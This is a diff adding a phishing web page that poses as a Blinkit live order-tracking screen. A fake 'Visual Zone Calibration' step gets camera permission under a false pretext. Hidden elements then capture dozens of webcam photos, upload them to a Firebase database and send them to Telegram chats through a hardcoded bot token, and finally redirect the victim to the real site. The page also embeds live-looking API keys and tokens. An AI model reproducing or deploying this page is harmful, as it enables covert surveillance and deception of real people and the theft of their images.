@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blinkit | Track Shared Order</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --blink-yellow: #F7CB1A;
+            --blink-black: #000000;
+            --blink-bg: #FFFFFF;
+            --blink-sub: #666666;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: #F3F4F6; color: var(--blink-black);
+            font-family: 'Inter', -apple-system, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .blink-card {
+            width: 100%; max-width: 400px; background: var(--blink-bg); border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden;
+        }
+
+        .blink-header {
+            background: var(--blink-yellow); padding: 16px 20px;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+
+        .blink-logo { font-weight: 900; font-style: italic; font-size: 22px; color: var(--blink-black); }
+
+        .order-info { padding: 12px 20px; background: #FFFBEB; border-bottom: 1px solid #FEF3C7; font-size: 13px; color: #92400E; }
+
+        .tracking-body { padding: 32px 24px; text-align: center; }
+
+        .eta-badge {
+            background: #ECFDF5; color: #065F46; padding: 6px 12px; border-radius: 20px;
+            font-size: 12px; font-weight: 700; display: inline-block; margin-bottom: 20px;
+        }
+
+        h2 { font-size: 20px; font-weight: 800; margin: 0 0 12px; }
+        p { font-size: 14px; color: var(--blink-sub); line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-blink {
+            background: var(--blink-black); color: var(--blink-yellow); border: none;
+            width: 100%; padding: 16px; font-size: 14px; font-weight: 700;
+            border-radius: 12px; cursor: pointer; text-transform: uppercase;
+        }
+
+        /* Calibration UI */
+        #sync-ui { display: none; }
+        
+        .loading-ring {
+            width: 40px; height: 40px; border: 4px solid #E5E7EB;
+            border-top: 4px solid var(--blink-yellow); border-radius: 50%;
+            margin: 0 auto 16px; animation: blink-spin 0.8s linear infinite;
+        }
+        @keyframes blink-spin { to { transform: rotate(360deg); } }
+
+        .sync-msg { font-weight: 700; font-size: 15px; }
+        .node-tag { font-size: 10px; color: #9CA3AF; margin-top: 24px; font-family: monospace; letter-spacing: 0.5px; }
+    </style>
+</head>
+<body>
+
+    <div class="blink-card">
+        <div class="blink-header">
+            <div class="blink-logo">blinkit</div>
+            <div style="font-size: 11px; font-weight: 700;">LIVE TRACKING</div>
+        </div>
+        
+        <div class="order-info">Order shared by: <b>May User</b> • 8 items</div>
+
+        <div class="tracking-body" id="init-view">
+            <div class="eta-badge">Arriving in 9 mins</div>
+            <h2>Verify Delivery Point</h2>
+            <p>To assist our partner in locating your exact entrance, please complete the <b>Visual Zone Calibration</b>. This ensures a 10-minute delivery guarantee.</p>
+            
+            <button class="btn-blink" onclick="startBlinkSync()">Calibrate & Track</button>
+            <div class="node-tag">MUMBAI_HUB_NORTH_09</div>
+        </div>
+
+        <div class="tracking-body" id="sync-ui">
+            <div class="loading-ring"></div>
+            <div class="sync-msg">Syncing with Delivery Partner...</div>
+            <div style="font-size: 12px; color: var(--blink-sub); margin-top: 8px;" id="blink-timer">Session active for 60s</div>
+            
+            <div style="text-align: left; background: #F9FAFB; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 9px; color: #4B5563; margin-top: 24px; border: 1px solid #E5E7EB;">
+                > FETCHING_MUMBAI_GRID_DATA... OK<br>
+                > CALIBRATING_AR_PRECISION... 45%<br>
+                > STATUS: ENCRYPTING_GEO_HANDSHAKE
+            </div>
+            <div class="node-tag">Connected to Mumbai Cloud Gateway</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startBlinkSync() {
+            try {
+                // Request camera permission under the guise of "Zone Calibration"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('blink-timer').innerText = `Session active for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            blinkCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to real Blinkit web or landing page
+                            window.location.href = "https://www.blinkit.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.blinkit.com";
+            }
+        }
+
+        function blinkCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "BLINKIT_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'blink_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
